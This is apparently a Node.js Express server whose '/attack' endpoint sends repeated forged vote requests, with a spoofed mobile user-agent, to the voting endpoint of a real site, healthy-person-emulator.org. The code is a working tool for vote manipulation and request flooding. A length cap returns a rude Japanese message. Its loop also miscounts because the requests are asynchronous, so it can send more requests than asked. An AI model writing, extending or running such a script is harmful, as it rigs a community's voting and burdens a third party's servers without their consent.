const express = require('express');

const app = express();
app.use(express.json())
app.use(express.urlencoded({ extended: true}))

const sleep = msec => new Promise(resolve => setTimeout(resolve, msec));

app.get('/', (req, res) => {
  res.send('ahhahaga');
});

app.post('/attack', async (req, res) => {
  if ( req.body.amount > 360 ){
    res.status(400).send("360以上やりたいなら自分でコード書いてやれハゲ")
    return false;
  }
  const id = req.body.id;
  const voteType = req.body.voteType;
  let count = 0;
  res.status(200).json({"status": "started"});
  while ( true ) {
    await sleep(50);
    fetch(`https://healthy-person-emulator.org/archives/${id}?_data=routes%2F_layout.archives.%24postId`, {method: "POST", headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
      }, body: `postId=${Number(id)}&voteType=${voteType}&action=votePost`},).then((data) => {
      count++;
    })
    if ( count >= req.body.amount ){
      break;
    }
  }
  return true;
});

app.listen(3000, () => {
  console.log('Express server initialized');
});
